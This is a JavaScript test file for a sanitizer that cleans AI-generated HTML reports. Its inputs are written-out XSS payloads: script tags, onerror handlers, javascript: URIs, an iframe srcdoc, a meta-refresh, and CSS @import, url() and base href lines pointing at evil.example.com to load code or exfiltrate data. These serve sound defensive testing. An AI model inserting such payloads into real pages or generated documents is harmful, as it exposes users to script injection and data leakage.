import { sanitizeGeneratedHtml } from '../utils/htmlSanitizer';

// ENG-1997 — createHtmlFile (passthrough, render, and deterministic-fallback
// branches) has no {{variable}} boundary to escape values into the way
// createHtmlFromTemplate does (ENG-1877), since the model authors the whole
// document. This sanitizes the finished document instead, so these tests
// exercise it directly against the real payloads the live-fire prod incident
// used, not synthetic stand-ins.
describe('sanitizeGeneratedHtml', () => {
  it('strips an inline <script> tag entirely', () => {
    const out = sanitizeGeneratedHtml('<div>Feedback: <script>alert(1)</script> done</div>');
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert(1)');
    expect(out).toContain('Feedback:');
    expect(out).toContain('done');
  });

  it('strips an onerror handler but keeps the rest of the tag', () => {
    const out = sanitizeGeneratedHtml('<img src="x" onerror="alert(1)">');
    expect(out).not.toMatch(/onerror/i);
    expect(out).toContain('src="x"');
  });

  it('strips every on* event-handler attribute regardless of tag', () => {
    const out = sanitizeGeneratedHtml(
      '<div onclick="steal()"><a href="#" onmouseover="alert(2)">hover</a></div>',
    );
    expect(out).not.toMatch(/on(click|mouseover)/i);
    expect(out).toContain('hover');
  });

  it('strips a javascript: URI from an href', () => {
    const out = sanitizeGeneratedHtml('<a href="javascript:alert(1)">click</a>');
    expect(out).not.toMatch(/javascript:/i);
  });

  it('closes the exact single-quote-breakout vector ENG-1877 found, via real parsing rather than string escaping', () => {
    const out = sanitizeGeneratedHtml("<img src='x' title='' onerror='alert(2)'>");
    expect(out).not.toMatch(/onerror/i);
  });

  it('is case-insensitive to evasion attempts (<SCRIPT>, ONERROR=)', () => {
    const out = sanitizeGeneratedHtml('<SCRIPT>alert(1)</SCRIPT><img src=x ONERROR=alert(2)>');
    expect(out.toLowerCase()).not.toContain('<script');
    expect(out.toLowerCase()).not.toContain('onerror');
  });

  it('allows a bare <script src> from the documented Chart.js CDN host', () => {
    const html = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>';
    expect(sanitizeGeneratedHtml(html)).toBe(html);
  });

  it('strips a <script src> from a host that is NOT the allowlisted CDN', () => {
    const out = sanitizeGeneratedHtml('<script src="https://evil.example.com/x.js"></script>');
    expect(out).not.toContain('<script');
  });

  it('strips an allowlisted-host <script src> that also carries an inline body', () => {
    const out = sanitizeGeneratedHtml(
      '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js">alert(1)</script>',
    );
    expect(out).not.toContain('<script');
    expect(out).not.toContain('alert(1)');
  });

  it('preserves the real Client Feedback payload from the live prod incident with all 3 vectors neutralized', () => {
    const raw =
      '<div class="feedback-box">\n' +
      "  <script>alert(1)</script> and O'Brien & Sons \"Premium\" Q3 and <img src=x onerror=alert(1)>\n" +
      '</div>';
    const out = sanitizeGeneratedHtml(raw);
    expect(out).not.toContain('<script');
    expect(out).not.toMatch(/onerror/i);
    expect(out).toContain("O'Brien");
    expect(out).toContain('Sons');
    expect(out).toContain('Premium');
    expect(out).toContain('Q3');
  });

  it('preserves the <!DOCTYPE html> declaration (sanitize-html otherwise drops it, which would push the browser into quirks mode)', () => {
    const html = '<!DOCTYPE html>\n<html><head><title>x</title></head><body>hi</body></html>';
    const out = sanitizeGeneratedHtml(html);
    expect(out.startsWith('<!DOCTYPE html>')).toBe(true);
    expect(out.match(/<!DOCTYPE html>/gi)).toHaveLength(1);
  });

  it('leaves ordinary document structure, styling, and tables untouched', () => {
    const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Report</title><style>body{color:#333}</style></head>
<body><h1>Report</h1><table><tr><td>Spend</td><td>$1,204.50</td></tr></table></body>
</html>`;
    const out = sanitizeGeneratedHtml(html);
    expect(out).toContain('<style>body{color:#333}</style>');
    expect(out).toContain('<table>');
    expect(out).toContain('Spend');
    expect(out).toContain('$1,204.50');
  });

  it('passes non-string / empty input through unchanged rather than throwing', () => {
    expect(sanitizeGeneratedHtml('')).toBe('');
    expect(sanitizeGeneratedHtml(undefined as unknown as string)).toBe(undefined);
  });

  // Round 2 — an independent adversarial review found the round-1 fix above
  // still had 4 real gaps. Each is closed here with the exact payload that
  // proved it, same discipline as the vectors above.
  describe('round 2: reviewer-found bypasses', () => {
    it('drops an iframe srcdoc attribute entirely (entity-escaping it is not enough — browsers HTML-decode attribute values on parse, then reparse a decoded srcdoc as its own document, so an escaped <script> re-materializes and runs)', () => {
      const out = sanitizeGeneratedHtml(
        '<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>',
      );
      expect(out).not.toMatch(/srcdoc/i);
    });

    it('drops a <style> tag containing @import', () => {
      const out = sanitizeGeneratedHtml('<style>@import url("http://evil.example.com/exfil.css");</style>');
      expect(out).not.toContain('evil.example.com');
      expect(out).not.toContain('@import');
    });

    it('drops a style="" attribute containing a non-data url()', () => {
      const out = sanitizeGeneratedHtml('<div style="background:url(http://evil.example.com/x.png)">hi</div>');
      expect(out).not.toContain('evil.example.com');
      expect(out).toContain('hi');
    });

    it('keeps a style="" attribute using a data: url() (no exfil surface)', () => {
      const html = '<div style="background-image:url(data:image/png;base64,aGk=)">x</div>';
      expect(sanitizeGeneratedHtml(html)).toBe(html);
    });

    it('keeps ordinary benign inline styles (color/padding/background) untouched', () => {
      const html = '<div style="color:#333;padding:8px;background:#f5f5f5">Report</div>';
      expect(sanitizeGeneratedHtml(html)).toBe(html);
    });

    it('keeps an ordinary benign <style> block untouched', () => {
      const html = '<style>body{font-family:Arial} h1{color:#222}</style>';
      expect(sanitizeGeneratedHtml(html)).toBe(html);
    });

    it('drops a <base href> tag (rewrites resolution of every relative URL in the document)', () => {
      const out = sanitizeGeneratedHtml('<base href="https://evil.example.com/">');
      expect(out).not.toContain('evil.example.com');
      expect(out).not.toMatch(/<base/i);
    });

    it('the Chart.js CDN allowlist is path-scoped, not just hostname-scoped — a different package/repo on the same CDN host is still stripped', () => {
      const otherPkg = sanitizeGeneratedHtml(
        '<script src="https://cdn.jsdelivr.net/npm/some-random-attacker-pkg@1.0.0/x.js"></script>',
      );
      expect(otherPkg).not.toContain('<script');
      const otherRepo = sanitizeGeneratedHtml(
        '<script src="https://cdn.jsdelivr.net/gh/attacker/repo@main/x.js"></script>',
      );
      expect(otherRepo).not.toContain('<script');
    });

    it('still allows the real Chart.js CDN script this tool documents', () => {
      const html = '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>';
      expect(sanitizeGeneratedHtml(html)).toBe(html);
    });
  });

  // Round 3 — an independent round-2 review found meta-refresh auto-navigation
  // is a live hazard sanitize-html's scheme allowlist doesn't cover (`content`
  // isn't a URL-typed attribute to it), same class as <base>: no legitimate
  // use in a generated report/email, so the whole tag is dropped outright.
  describe('round 3: meta-refresh auto-navigation', () => {
    it('drops a meta-refresh to a javascript: URL', () => {
      const out = sanitizeGeneratedHtml('<meta http-equiv="refresh" content="0;url=javascript:alert(1)">');
      expect(out).not.toMatch(/<meta/i);
      expect(out).not.toMatch(/javascript:/i);
    });

    it('drops a meta-refresh regardless of case or destination scheme', () => {
      const out = sanitizeGeneratedHtml('<meta http-equiv="Refresh" content="0;url=data:text/html,<script>alert(1)</script>">');
      expect(out).not.toMatch(/<meta/i);
    });

    it('keeps ordinary benign <meta> tags (charset, viewport) untouched', () => {
      expect(sanitizeGeneratedHtml('<meta charset="UTF-8">')).toBe('<meta charset="UTF-8" />');
      expect(sanitizeGeneratedHtml('<meta name="viewport" content="width=device-width, initial-scale=1.0">'))
        .toBe('<meta name="viewport" content="width=device-width, initial-scale=1.0" />');
    });
  });
});
